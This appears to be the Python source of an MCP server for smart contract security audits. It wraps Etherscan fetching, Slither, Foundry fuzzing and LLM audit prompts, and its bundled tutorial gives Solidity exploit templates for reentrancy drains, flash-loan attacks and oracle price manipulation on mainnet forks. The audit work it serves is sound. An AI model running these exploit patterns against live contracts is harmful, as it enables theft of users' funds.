#!/usr/bin/env python3
"""
Audit MCP Server
================

MCP server specialized for smart contract security audits.
Provides tools for:
- Fetching contracts from Etherscan/Basescan
- Running Slither static analysis
- Running Foundry fuzzing
- Generating detailed indexes (excluding lib folders)
- Dependency graph generation
- POC examples and tutorials

Dependencies:
    pip install mcp fastmcp openai python-dotenv httpx requests slither-analyzer
    foundryup && forge --version
"""

import sys
import logging
import json
import os
import subprocess
import shutil
import tempfile
import asyncio
from pathlib import Path
from typing import List, Dict, Any, Optional
from mcp.server.fastmcp import FastMCP
from dotenv import load_dotenv
import httpx
import openai
import time
import tiktoken

load_dotenv()

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(filename)s:%(lineno)d - %(message)s'
)
logger = logging.getLogger(__name__)

# Initialize MCP server
mcp_server = FastMCP("AuditMCPServer")

# Global variables
CACHE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".audit_cache")
os.makedirs(CACHE_DIR, exist_ok=True)

# Exclude patterns for smart contract audits (exclude lib folders)
SMART_CONTRACT_EXCLUDES = [
    "lib/**", "**/lib/**", "node_modules/**", "**/.git/**", "**/.venv/**", 
    "dist/**", "build/**", "**/target/**", "**/bin/**", "**/obj/**",
    "**/__pycache__/**", "**/.pytest_cache/**", "**/.mypy_cache/**",
    "**/*.pyc", "**/*.pyo", "**/*.pyd", "**/*.log", "**/*.tmp",
    "**/*.swp", "**/*~", "**/.DS_Store", "**/*.zip", "**/*.tar",
    "**/*.gz", "**/*.json", "cache/**", "**/cache/**"
]

# Audit prompt templates
AUDIT_PROMPTS = {
    "bootstrap": """You are an expert smart contract auditor. 
Read the detailed index and prioritize contracts for inspection.
Focus on: (1) contracts with most external functions, (2) contracts handling value/tokens, (3) access control patterns.
Output JSON: {{"priority": ["contract1.sol", "contract2.sol"], "skip": ["lib/...", "test/..."]}}

INDEX:
{detailed_index}""",

    "contract_summary": """Analyze this Solidity contract and provide:
• **Purpose**: One sentence describing what this contract does
• **Key Functions**: List all external/public functions with brief descriptions  
• **Access Control**: Who can call what functions
• **Value Handling**: How does it handle ETH/tokens
• **External Calls**: List all external contract calls and their risks
• **Critical Invariants**: What conditions must always hold true

CONTRACT: {file_name}
```solidity
{contract_code}
```""",

    "vulnerability_scan": """Review this Solidity contract for security vulnerabilities.
Focus on common attack vectors:
- Reentrancy attacks
- Access control bypasses  
- Integer overflow/underflow
- Flash loan attacks
- Front-running vulnerabilities
- Logic bugs in financial calculations
- Unchecked external calls

For each issue found, provide:
- Severity (Critical/High/Medium/Low)
- Location (function name, line reference)
- Description of the vulnerability
- Potential impact
- Recommended fix

CONTRACT: {file_name}
```solidity
{contract_code}
```""",

    "slither_analysis": """Analyze these Slither findings and prioritize them:
Remove false positives and focus on real security issues.
Group by severity and provide actionable summaries.

SLITHER OUTPUT:
{slither_output}""",

    "dependency_analysis": """Analyze contract dependencies and inheritance:
- Map the inheritance hierarchy
- Identify critical external dependencies
- Look for circular dependencies or complex interactions
- Highlight upgrade patterns and proxy implementations

CONTRACTS:
{contract_files}""",

    "poc_generation": """Generate a proof-of-concept exploit for this vulnerability:

VULNERABILITY:
{vulnerability_description}

CONTRACT CODE:
{contract_code}

Provide:
1. Foundry test file that demonstrates the exploit
2. Step-by-step explanation of the attack
3. Anvil fork setup commands if needed"""
}

def check_dependencies():
    """Check if required tools are installed."""
    required_tools = {
        "slither": "slither --version",
        "forge": "forge --version", 
        "cast": "cast --version"
    }
    
    missing = []
    for tool, command in required_tools.items():
        try:
            result = subprocess.run(command.split(), capture_output=True, text=True)
            if result.returncode != 0:
                missing.append(tool)
            else:
                logger.info(f"✅ {tool} available: {result.stdout.strip()}")
        except FileNotFoundError:
            missing.append(tool)
    
    if missing:
        logger.warning(f"⚠️ Missing tools: {missing}")
        logger.info("Install with: pip install slither-analyzer && foundryup")
    
    return len(missing) == 0

@mcp_server.tool()
def fetch_contract_from_etherscan(address: str, network: str = "mainnet") -> Dict[str, Any]:
    """
    Fetch contract source code using Etherscan V2 API (unified key for all chains).
    
    Args:
        address: Contract address (0x...)
        network: Network name (mainnet, arbitrum, base, polygon, etc.)
    
    Returns:
        Dict with contract source code and metadata
    """
    try:
        # Network to chain ID mapping for V2 API
        chain_ids = {
            "mainnet": 1,
            "arbitrum": 42161, 
            "base": 8453,
            "polygon": 137,
            "optimism": 10,
            "bsc": 56,
            "avalanche": 43114
        }
        
        if network not in chain_ids:
            return {"error": f"Unsupported network: {network}. Supported: {list(chain_ids.keys())}"}
        
        chain_id = chain_ids[network]
        
        # Use unified API key (Etherscan V2 supports all chains with one key)
        api_key = os.getenv("ETHERSCAN_API_KEY")
        if not api_key:
            return {"error": "No API key found. Set ETHERSCAN_API_KEY"}
        
        # Etherscan V2 API endpoint
        url = "https://api.etherscan.io/v2/api"
        params = {
            "chainid": chain_id,
            "module": "contract",
            "action": "getsourcecode", 
            "address": address,
            "apikey": api_key
        }
        
        logger.info(f"Fetching contract from {network} (chain {chain_id}) using V2 API...")
        response = httpx.get(url, params=params)
        data = response.json()
        
        if data["status"] != "1":
            return {"error": f"API error: {data.get('message', 'Unknown error')}"}
        
        result = data["result"][0]
        
        # Save to cache directory
        contract_dir = Path(CACHE_DIR) / f"{network}_{address}"
        contract_dir.mkdir(exist_ok=True)
        
        # Handle multi-file contracts
        source_code = result["SourceCode"]
        if source_code.startswith("{"):
            # Multiple files in JSON format
            try:
                source_data = json.loads(source_code[1:-1])  # Remove outer braces
                sources = source_data.get("sources", {})
                
                for file_path, file_data in sources.items():
                    file_path_clean = file_path.replace("@", "").replace("/", "_")
                    (contract_dir / f"{file_path_clean}.sol").write_text(file_data["content"])
                
                main_file = f"{result['ContractName']}.sol"
            except json.JSONDecodeError:
                # Single file
                main_file = f"{result['ContractName']}.sol"
                (contract_dir / main_file).write_text(source_code)
        else:
            # Single file
            main_file = f"{result['ContractName']}.sol"
            (contract_dir / main_file).write_text(source_code)
        
        # Save metadata
        metadata = {
            "contract_name": result["ContractName"],
            "compiler_version": result["CompilerVersion"],
            "optimization": result["OptimizationUsed"],
            "runs": result["Runs"],
            "evm_version": result.get("EVMVersion", "unknown"),
            "network": network,
            "address": address,
            "fetched_at": time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        (contract_dir / "metadata.json").write_text(json.dumps(metadata, indent=2))
        
        return {
            "success": True,
            "contract_dir": str(contract_dir),
            "main_file": main_file,
            "metadata": metadata,
            "files_count": len(list(contract_dir.glob("*.sol")))
        }
        
    except Exception as e:
        logger.error(f"Error fetching contract: {e}")
        return {"error": str(e)}

@mcp_server.tool()
def generate_detailed_index_for_audit(project_path: str, exclude_libs: bool = True) -> Dict[str, Any]:
    """
    Generate detailed index for smart contract audit (excludes lib folders by default).
    
    Args:
        project_path: Path to the smart contract project
        exclude_libs: Whether to exclude lib folders (default: True)
    
    Returns:
        Dict with index content and metadata
    """
    try:
        project_path = Path(project_path).resolve()
        if not project_path.exists():
            return {"error": f"Project path does not exist: {project_path}"}
        
        # Prepare exclude patterns
        excludes = SMART_CONTRACT_EXCLUDES.copy()
        if not exclude_libs:
            excludes = [e for e in excludes if "lib" not in e]
        
        # Use the existing genidx script with modifications for smart contracts
        script_dir = Path(__file__).parent
        genidx_script = script_dir.parent / "mcpdoc" / "parallel_folder_indexer.py"
        
        if not genidx_script.exists():
            # Fallback to basic implementation
            return generate_basic_index(project_path, excludes)
        
        # Run the indexer with smart contract specific settings
        env = os.environ.copy()
        env["OPENAI_API_KEY"] = os.getenv("OPENAI_API_KEY")
        
        result = subprocess.run([
            sys.executable, str(genidx_script),
            str(project_path),
            "--workers", "10",
            "--batch-size", "5"
        ], capture_output=True, text=True, env=env, cwd=project_path)
        
        if result.returncode != 0:
            logger.error(f"genidx failed: {result.stderr}")
            return generate_basic_index(project_path, excludes)
        
        # Read the generated detailed_index.md
        index_file = project_path / "detailed_index.md"
        if index_file.exists():
            content = index_file.read_text()
            
            # Count tokens for context awareness
            encoding = tiktoken.encoding_for_model("gpt-4")
            token_count = len(encoding.encode(content))
            
            return {
                "success": True,
                "index_content": content,
                "token_count": token_count,
                "index_file": str(index_file),
                "project_path": str(project_path),
                "exclude_libs": exclude_libs
            }
        else:
            return {"error": "detailed_index.md was not generated"}
        
    except Exception as e:
        logger.error(f"Error generating index: {e}")
        return {"error": str(e)}

def generate_basic_index(project_path: Path, excludes: List[str]) -> Dict[str, Any]:
    """Fallback basic index generation."""
    try:
        files = []
        for file_path in project_path.rglob("*.sol"):
            # Check if file should be excluded
            relative_path = file_path.relative_to(project_path)
            should_exclude = any(
                relative_path.match(pattern) for pattern in excludes
            )
            
            if should_exclude:
                continue
            
            try:
                content = file_path.read_text()
                size = len(content)
                lines = content.count('\n')
                
                files.append({
                    "path": str(relative_path),
                    "size": size,
                    "lines": lines,
                    "type": "solidity"
                })
            except Exception as e:
                logger.warning(f"Could not read {file_path}: {e}")
        
        # Generate simple index
        index_content = f"# Smart Contract Audit Index\n\n"
        index_content += f"**Project**: {project_path.name}\n"
        index_content += f"**Generated**: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        index_content += f"**Files**: {len(files)} Solidity files\n\n"
        
        index_content += "## Contract Files\n\n"
        for file_info in sorted(files, key=lambda x: x["path"]):
            index_content += f"### {file_info['path']}\n"
            index_content += f"- **Size**: {file_info['size']} bytes\n"
            index_content += f"- **Lines**: {file_info['lines']}\n\n"
        
        # Save index
        index_file = project_path / "detailed_index.md"
        index_file.write_text(index_content)
        
        encoding = tiktoken.encoding_for_model("gpt-4")
        token_count = len(encoding.encode(index_content))
        
        return {
            "success": True,
            "index_content": index_content,
            "token_count": token_count,
            "index_file": str(index_file),
            "project_path": str(project_path),
            "method": "basic_fallback"
        }
        
    except Exception as e:
        return {"error": str(e)}

@mcp_server.tool()
def read_multiple_files(file_paths: List[str], base_path: str = "") -> Dict[str, Any]:
    """
    Read multiple files in parallel for analysis.
    
    Args:
        file_paths: List of file paths to read
        base_path: Base directory path (optional)
        
    Returns:
        Dict with file contents and metadata
    """
    try:
        results = {}
        base = Path(base_path) if base_path else Path.cwd()
        
        for file_path in file_paths:
            try:
                full_path = base / file_path if not Path(file_path).is_absolute() else Path(file_path)
                
                if not full_path.exists():
                    results[file_path] = {"error": "File not found"}
                    continue
                
                content = full_path.read_text(encoding='utf-8')
                
                # Count tokens for context management
                encoding = tiktoken.encoding_for_model("gpt-4")
                token_count = len(encoding.encode(content))
                
                results[file_path] = {
                    "content": content,
                    "size": len(content),
                    "lines": content.count('\n'),
                    "token_count": token_count,
                    "path": str(full_path)
                }
                
            except Exception as e:
                results[file_path] = {"error": str(e)}
        
        total_tokens = sum(
            r.get("token_count", 0) for r in results.values() 
            if "error" not in r
        )
        
        return {
            "success": True,
            "files": results,
            "total_files": len(file_paths),
            "successful_reads": len([r for r in results.values() if "error" not in r]),
            "total_tokens": total_tokens
        }
        
    except Exception as e:
        return {"error": str(e)}

@mcp_server.tool()
def run_slither_analysis(project_path: str, output_format: str = "json") -> Dict[str, Any]:
    """
    Run Slither static analysis on smart contracts.
    
    Args:
        project_path: Path to the smart contract project
        output_format: Output format (json, text, sarif)
    
    Returns:
        Dict with Slither analysis results
    """
    try:
        project_path = Path(project_path).resolve()
        if not project_path.exists():
            return {"error": f"Project path does not exist: {project_path}"}
        
        # Check if slither is available
        try:
            subprocess.run(["slither", "--version"], capture_output=True, check=True)
        except (FileNotFoundError, subprocess.CalledProcessError):
            return {"error": "Slither not installed. Run: pip install slither-analyzer"}
        
        # Prepare output file
        output_file = project_path / f"slither_report.{output_format}"
        
        # Build slither command
        cmd = ["slither", str(project_path)]
        
        if output_format == "json":
            cmd.extend(["--json", str(output_file)])
        elif output_format == "sarif":
            cmd.extend(["--sarif", str(output_file)])
        
        # Add additional useful options
        cmd.extend([
            "--exclude-dependencies",  # Don't analyze dependencies
            "--filter-paths", "lib/",  # Exclude lib folder
        ])
        
        # Run slither
        result = subprocess.run(
            cmd, 
            capture_output=True, 
            text=True, 
            cwd=project_path,
            timeout=300  # 5 minute timeout
        )
        
        # Read output
        analysis_output = ""
        if output_file.exists():
            analysis_output = output_file.read_text()
        else:
            analysis_output = result.stdout
        
        # Parse results
        findings = []
        if output_format == "json" and analysis_output:
            try:
                data = json.loads(analysis_output)
                findings = data.get("results", {}).get("detectors", [])
            except json.JSONDecodeError:
                logger.warning("Could not parse Slither JSON output")
        
        return {
            "success": True,
            "output": analysis_output,
            "stderr": result.stderr,
            "return_code": result.returncode,
            "findings_count": len(findings),
            "findings": findings,
            "output_file": str(output_file) if output_file.exists() else None,
            "command": " ".join(cmd)
        }
        
    except subprocess.TimeoutExpired:
        return {"error": "Slither analysis timed out (5 minutes)"}
    except Exception as e:
        logger.error(f"Error running Slither: {e}")
        return {"error": str(e)}

@mcp_server.tool()
def run_foundry_tests_and_fuzz(project_path: str, fuzz_runs: int = 256) -> Dict[str, Any]:
    """
    Run Foundry tests and fuzzing.
    
    Args:
        project_path: Path to the Foundry project
        fuzz_runs: Number of fuzz runs (default: 256)
    
    Returns:
        Dict with test and fuzz results
    """
    try:
        project_path = Path(project_path).resolve()
        if not project_path.exists():
            return {"error": f"Project path does not exist: {project_path}"}
        
        # Check if forge is available
        try:
            subprocess.run(["forge", "--version"], capture_output=True, check=True)
        except (FileNotFoundError, subprocess.CalledProcessError):
            return {"error": "Foundry not installed. Run: foundryup"}
        
        results = {}
        
        # 1. Build the project
        build_result = subprocess.run(
            ["forge", "build"],
            capture_output=True,
            text=True,
            cwd=project_path
        )
        
        results["build"] = {
            "success": build_result.returncode == 0,
            "stdout": build_result.stdout,
            "stderr": build_result.stderr
        }
        
        if build_result.returncode != 0:
            return {"error": "Build failed", "details": results}
        
        # 2. Run tests with verbose output
        test_result = subprocess.run(
            ["forge", "test", "-vvv", "--gas-report"],
            capture_output=True,
            text=True,
            cwd=project_path,
            timeout=300  # 5 minute timeout
        )
        
        results["tests"] = {
            "success": test_result.returncode == 0,
            "stdout": test_result.stdout,
            "stderr": test_result.stderr
        }
        
        # 3. Run fuzzing if test files exist
        test_files = list(project_path.glob("test/**/*.sol")) + list(project_path.glob("testFoundry/**/*.sol"))
        
        if test_files:
            fuzz_result = subprocess.run(
                ["forge", "test", f"--fuzz-runs", str(fuzz_runs), "-vvv"],
                capture_output=True,
                text=True,
                cwd=project_path,
                timeout=600  # 10 minute timeout for fuzzing
            )
            
            results["fuzz"] = {
                "success": fuzz_result.returncode == 0,
                "stdout": fuzz_result.stdout,
                "stderr": fuzz_result.stderr,
                "fuzz_runs": fuzz_runs
            }
        else:
            results["fuzz"] = {"skipped": "No test files found"}
        
        # 4. Generate coverage if possible
        coverage_result = subprocess.run(
            ["forge", "coverage", "--report", "lcov"],
            capture_output=True,
            text=True,
            cwd=project_path,
            timeout=300
        )
        
        results["coverage"] = {
            "success": coverage_result.returncode == 0,
            "stdout": coverage_result.stdout,
            "stderr": coverage_result.stderr
        }
        
        return {
            "success": True,
            "results": results,
            "project_path": str(project_path)
        }
        
    except subprocess.TimeoutExpired:
        return {"error": "Foundry tests timed out"}
    except Exception as e:
        logger.error(f"Error running Foundry tests: {e}")
        return {"error": str(e)}

@mcp_server.tool()
def get_audit_prompt(prompt_type: str, **kwargs) -> Dict[str, str]:
    """
    Get audit prompt template for specific analysis type.
    
    Args:
        prompt_type: Type of prompt (bootstrap, contract_summary, vulnerability_scan, etc.)
        **kwargs: Variables to substitute in the prompt
    
    Returns:
        Dict with formatted prompt
    """
    try:
        if prompt_type not in AUDIT_PROMPTS:
            available = list(AUDIT_PROMPTS.keys())
            return {"error": f"Unknown prompt type: {prompt_type}. Available: {available}"}
        
        template = AUDIT_PROMPTS[prompt_type]
        
        # Substitute variables
        try:
            formatted_prompt = template.format(**kwargs)
        except KeyError as e:
            return {"error": f"Missing required variable: {e}"}
        
        return {
            "success": True,
            "prompt_type": prompt_type,
            "prompt": formatted_prompt,
            "variables_used": list(kwargs.keys())
        }
        
    except Exception as e:
        return {"error": str(e)}

@mcp_server.tool()
def make_audit(project_path: str, include_etherscan: bool = False, contract_address: str = "", network: str = "mainnet") -> Dict[str, Any]:
    """
    Complete audit workflow: index generation, static analysis, fuzzing, and reporting.
    
    Args:
        project_path: Path to smart contract project
        include_etherscan: Whether to fetch from Etherscan first
        contract_address: Contract address for Etherscan (if include_etherscan=True)
        network: Network for Etherscan fetch
    
    Returns:
        Dict with complete audit results
    """
    try:
        audit_results = {
            "audit_started": time.strftime('%Y-%m-%d %H:%M:%S'),
            "project_path": project_path,
            "steps": {}
        }
        
        # Step 1: Fetch from Etherscan if requested
        if include_etherscan and contract_address:
            logger.info("Step 1: Fetching contract from Etherscan...")
            etherscan_result = fetch_contract_from_etherscan(contract_address, network)
            audit_results["steps"]["etherscan_fetch"] = etherscan_result
            
            if etherscan_result.get("success"):
                project_path = etherscan_result["contract_dir"]
                audit_results["project_path"] = project_path
        
        # Step 2: Generate detailed index
        logger.info("Step 2: Generating detailed index...")
        index_result = generate_detailed_index_for_audit(project_path, exclude_libs=True)
        audit_results["steps"]["index_generation"] = index_result
        
        if not index_result.get("success"):
            return {"error": "Failed to generate index", "details": audit_results}
        
        # Step 3: Run Slither analysis
        logger.info("Step 3: Running Slither static analysis...")
        slither_result = run_slither_analysis(project_path)
        audit_results["steps"]["slither_analysis"] = slither_result
        
        # Step 4: Run Foundry tests and fuzzing
        logger.info("Step 4: Running Foundry tests and fuzzing...")
        foundry_result = run_foundry_tests_and_fuzz(project_path)
        audit_results["steps"]["foundry_testing"] = foundry_result
        
        # Step 5: Generate summary
        total_findings = slither_result.get("findings_count", 0)
        test_success = foundry_result.get("success", False)
        
        audit_results["summary"] = {
            "total_slither_findings": total_findings,
            "foundry_tests_passed": test_success,
            "index_token_count": index_result.get("token_count", 0),
            "audit_completed": time.strftime('%Y-%m-%d %H:%M:%S'),
            "recommendations": [
                "Review Slither findings, especially high/medium severity",
                "Analyze test coverage and add missing test cases",
                "Check for missing access controls and input validation",
                "Review upgrade patterns and proxy implementations"
            ]
        }
        
        # Step 6: Save audit report
        report_file = Path(project_path) / "audit_report.json"
        with open(report_file, 'w') as f:
            json.dump(audit_results, f, indent=2)
        
        audit_results["report_file"] = str(report_file)
        
        return {
            "success": True,
            "audit_results": audit_results
        }
        
    except Exception as e:
        logger.error(f"Error in make_audit: {e}")
        return {"error": str(e)}

@mcp_server.tool() 
def generate_dependency_graph(project_path: str) -> Dict[str, Any]:
    """
    Generate dependency graph for smart contracts.
    
    Args:
        project_path: Path to the smart contract project
        
    Returns:
        Dict with dependency graph and analysis
    """
    try:
        project_path = Path(project_path).resolve()
        dependencies = {}
        imports = {}
        
        # Find all Solidity files
        sol_files = list(project_path.rglob("*.sol"))
        sol_files = [f for f in sol_files if "lib/" not in str(f)]  # Exclude lib
        
        for sol_file in sol_files:
            try:
                content = sol_file.read_text()
                relative_path = str(sol_file.relative_to(project_path))
                
                # Extract imports
                import_lines = [
                    line.strip() for line in content.split('\n') 
                    if line.strip().startswith('import')
                ]
                
                file_imports = []
                for import_line in import_lines:
                    # Extract the imported file path
                    if '"' in import_line:
                        imported = import_line.split('"')[1]
                        file_imports.append(imported)
                    elif "'" in import_line:
                        imported = import_line.split("'")[1]
                        file_imports.append(imported)
                
                imports[relative_path] = file_imports
                
                # Extract inheritance
                contracts = []
                lines = content.split('\n')
                for line in lines:
                    line = line.strip()
                    if line.startswith('contract ') or line.startswith('interface ') or line.startswith('abstract contract '):
                        if ' is ' in line:
                            # Has inheritance
                            parts = line.split(' is ')
                            if len(parts) > 1:
                                inherited = [c.strip().split()[0] for c in parts[1].split(',')]
                                contracts.append({
                                    "name": line.split()[1],
                                    "inherits": inherited
                                })
                        else:
                            # No inheritance
                            contracts.append({
                                "name": line.split()[1],
                                "inherits": []
                            })
                
                dependencies[relative_path] = {
                    "imports": file_imports,
                    "contracts": contracts
                }
                
            except Exception as e:
                logger.warning(f"Could not analyze {sol_file}: {e}")
        
        # Build dependency graph
        graph = {
            "nodes": [],
            "edges": []
        }
        
        for file_path, data in dependencies.items():
            graph["nodes"].append({
                "id": file_path,
                "type": "file",
                "contracts": [c["name"] for c in data["contracts"]]
            })
            
            for imported in data["imports"]:
                graph["edges"].append({
                    "from": file_path,
                    "to": imported,
                    "type": "import"
                })
        
        # Analyze critical dependencies
        analysis = {
            "total_files": len(dependencies),
            "total_imports": sum(len(d["imports"]) for d in dependencies.values()),
            "files_with_most_imports": sorted(
                dependencies.items(),
                key=lambda x: len(x[1]["imports"]),
                reverse=True
            )[:5],
            "circular_dependencies": find_circular_dependencies(imports),
            "external_dependencies": find_external_dependencies(imports)
        }
        
        return {
            "success": True,
            "dependencies": dependencies,
            "graph": graph,
            "analysis": analysis,
            "project_path": str(project_path)
        }
        
    except Exception as e:
        logger.error(f"Error generating dependency graph: {e}")
        return {"error": str(e)}

def find_circular_dependencies(imports: Dict[str, List[str]]) -> List[List[str]]:
    """Find circular dependencies in import graph."""
    # Simple cycle detection (could be enhanced)
    cycles = []
    
    def has_path(start: str, end: str, visited: set) -> bool:
        if start == end:
            return True
        if start in visited:
            return False
        
        visited.add(start)
        for imported in imports.get(start, []):
            if has_path(imported, end, visited.copy()):
                return True
        return False
    
    for file_path in imports:
        for imported in imports[file_path]:
            if has_path(imported, file_path, set()):
                cycle = [file_path, imported]
                if cycle not in cycles and cycle[::-1] not in cycles:
                    cycles.append(cycle)
    
    return cycles

def find_external_dependencies(imports: Dict[str, List[str]]) -> List[str]:
    """Find external dependencies (imports not in the project)."""
    all_files = set(imports.keys())
    external_deps = set()
    
    for file_imports in imports.values():
        for imported in file_imports:
            # Normalize path
            if not any(imported in f for f in all_files):
                external_deps.add(imported)
    
    return list(external_deps)

@mcp_server.tool()
def get_poc_tutorial() -> Dict[str, str]:
    """
    Get tutorial for setting up Proof of Concept exploits with Anvil and Foundry.
    
    Returns:
        Dict with tutorial content and examples
    """
    
    tutorial_content = """
# Smart Contract Exploit POC Tutorial

## Prerequisites
```bash
# Install Foundry
foundryup

# Verify installation
forge --version
cast --version
anvil --version
```

## Setting Up Anvil Fork

### 1. Start Anvil Fork
```bash
# Fork mainnet at latest block
anvil --fork-url https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY

# Fork at specific block (for reproducible exploits)
anvil --fork-url https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY --fork-block-number 18000000

# Fork with more accounts
anvil --fork-url https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY --accounts 20
```

### 2. Basic Exploit Template
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract ExploitPOC is Test {
    address constant VICTIM_CONTRACT = 0x...; // Target contract
    address constant TOKEN = 0x...; // Target token
    
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        // Fork mainnet at block before exploit
        vm.createFork("https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY", BLOCK_NUMBER);
        
        // Give attacker some ETH
        vm.deal(attacker, 100 ether);
        
        // Give attacker some tokens if needed
        deal(TOKEN, attacker, 1000e18);
    }
    
    function testExploit() public {
        vm.startPrank(attacker);
        
        uint256 balanceBefore = IERC20(TOKEN).balanceOf(attacker);
        console.log("Balance before:", balanceBefore);
        
        // Execute exploit steps here
        // ...
        
        uint256 balanceAfter = IERC20(TOKEN).balanceOf(attacker);
        console.log("Balance after:", balanceAfter);
        
        assertGt(balanceAfter, balanceBefore, "Exploit failed");
        
        vm.stopPrank();
    }
}
```

## Common Exploit Patterns

### Reentrancy Attack
```solidity
contract ReentrancyExploit is Test {
    VulnerableContract target;
    bool attacking = false;
    
    function testReentrancy() public {
        target = new VulnerableContract();
        
        // Deposit initial amount
        target.deposit{value: 1 ether}();
        
        // Start the attack
        attacking = true;
        target.withdraw(1 ether);
        
        // Check we drained more than we should
        assertGt(address(this).balance, 1 ether);
    }
    
    // Fallback function for reentrancy
    receive() external payable {
        if (attacking && address(target).balance > 0) {
            target.withdraw(1 ether);
        }
    }
}
```

### Flash Loan Attack
```solidity
import "./interfaces/IFlashLoanProvider.sol";

contract FlashLoanExploit is Test {
    IFlashLoanProvider flashLoan;
    VulnerableContract target;
    
    function testFlashLoanAttack() public {
        flashLoan = IFlashLoanProvider(FLASH_LOAN_ADDRESS);
        target = VulnerableContract(TARGET_ADDRESS);
        
        // Request flash loan
        uint256 amount = 1000000e18; // 1M tokens
        flashLoan.flashLoan(amount, abi.encode(target));
    }
    
    function onFlashLoan(uint256 amount, bytes calldata data) external {
        VulnerableContract _target = abi.decode(data, (VulnerableContract));
        
        // Use borrowed funds to exploit target
        // 1. Manipulate price oracle
        // 2. Execute profitable trade  
        // 3. Repay flash loan + fee
        
        // Return funds
        IERC20(TOKEN).transfer(msg.sender, amount + fee);
    }
}
```

## Testing Commands

```bash
# Run specific exploit test
forge test --match-test testExploit -vvvv

# Run with fork
forge test --fork-url $ETH_RPC_URL --match-test testExploit -vvvv

# Run at specific block
forge test --fork-url $ETH_RPC_URL --fork-block-number 18000000 --match-test testExploit -vvvv

# Generate gas report
forge test --gas-report --match-test testExploit
```

## Debugging Tools

```solidity
// In your test:
import "forge-std/console.sol";

// Log values
console.log("Balance:", balance);
console.log("Address:", address(contract));
console.logBytes32(hash);

// Inspect state changes
vm.startPrank(user);
contract.someFunction();
vm.stopPrank();

// Check events
vm.expectEmit(true, true, false, true);
emit SomeEvent(param1, param2);
```

## Best Practices

1. **Always fork at specific block** for reproducible results
2. **Use vm.deal() and deal()** to set up initial conditions  
3. **Log extensively** to understand exploit flow
4. **Test edge cases** - what happens with different amounts?
5. **Verify assumptions** - check that contracts behave as expected
6. **Document the exploit** - explain each step clearly

## Advanced Techniques

### State Manipulation
```solidity
// Change storage slots
vm.store(address(contract), bytes32(slot), bytes32(value));

// Warp time
vm.warp(block.timestamp + 1 days);

// Change block number
vm.roll(block.number + 100);

// Impersonate addresses
vm.startPrank(WHALE_ADDRESS);
```

### Price Oracle Manipulation
```solidity
// Manipulate Uniswap V2 price
function manipulatePrice() internal {
    IUniswapV2Pair pair = IUniswapV2Pair(PAIR_ADDRESS);
    
    // Buy large amount to change ratio
    router.swapExactETHForTokens{value: 1000 ether}(
        0, path, address(this), block.timestamp
    );
    
    // Now oracle shows manipulated price
}
```
"""
    
    examples = {
        "basic_exploit": """
contract BasicExploit is Test {
    function testBasicVulnerability() public {
        // Setup
        VulnerableContract target = new VulnerableContract();
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);
        
        vm.startPrank(attacker);
        
        // Exploit steps
        uint256 balanceBefore = attacker.balance;
        target.vulnerableFunction{value: 1 ether}();
        uint256 balanceAfter = attacker.balance;
        
        // Verify exploit worked
        assertGt(balanceAfter, balanceBefore);
        
        vm.stopPrank();
    }
}
        """,
        
        "foundry_toml": """
[profile.default]
src = "src"
out = "out"  
libs = ["lib"]
test = "test"
cache_path = "cache"

# Useful for testing
fuzz = { runs = 256 }
gas_reports = ["*"]

# RPC endpoints for forking
[rpc_endpoints]
mainnet = "https://eth-mainnet.g.alchemy.com/v2/${API_KEY}"
arbitrum = "https://arb-mainnet.g.alchemy.com/v2/${API_KEY}"
        """,
        
        "anvil_commands": """
# Basic fork
anvil --fork-url $ETH_RPC_URL

# Fork at specific block with custom port
anvil --fork-url $ETH_RPC_URL --fork-block-number 18000000 --port 8546

# Fork with custom gas limit and accounts
anvil --fork-url $ETH_RPC_URL --gas-limit 30000000 --accounts 50

# Fork with custom chain ID
anvil --fork-url $ETH_RPC_URL --chain-id 1337
        """
    }
    
    return {
        "success": True,
        "tutorial": tutorial_content,
        "examples": examples,
        "quick_reference": {
            "setup_fork": "anvil --fork-url $RPC_URL --fork-block-number BLOCK",
            "run_test": "forge test --fork-url $RPC_URL --match-test testExploit -vvvv",
            "debug": "forge test --fork-url $RPC_URL --match-test testExploit -vvvv --debug",
            "gas_report": "forge test --gas-report"
        }
    }

def main():
    """Main server startup."""
    logger.info("🔍 Starting Audit MCP Server...")
    
    # Check dependencies
    deps_ok = check_dependencies()
    if not deps_ok:
        logger.warning("⚠️ Some dependencies missing - some features may not work")
    
    # Verify API keys
    if not os.getenv("OPENAI_API_KEY"):
        logger.error("❌ OPENAI_API_KEY not set")
    else:
        logger.info("✅ OpenAI API key found")
    
    logger.info("🚀 Audit MCP Server ready!")
    logger.info("📋 Available tools:")
    logger.info("  - fetch_contract_from_etherscan")
    logger.info("  - generate_detailed_index_for_audit") 
    logger.info("  - read_multiple_files")
    logger.info("  - run_slither_analysis")
    logger.info("  - run_foundry_tests_and_fuzz")
    logger.info("  - get_audit_prompt")
    logger.info("  - make_audit")
    logger.info("  - generate_dependency_graph")
    logger.info("  - get_poc_tutorial")
    
    mcp_server.run()

if __name__ == "__main__":
    main()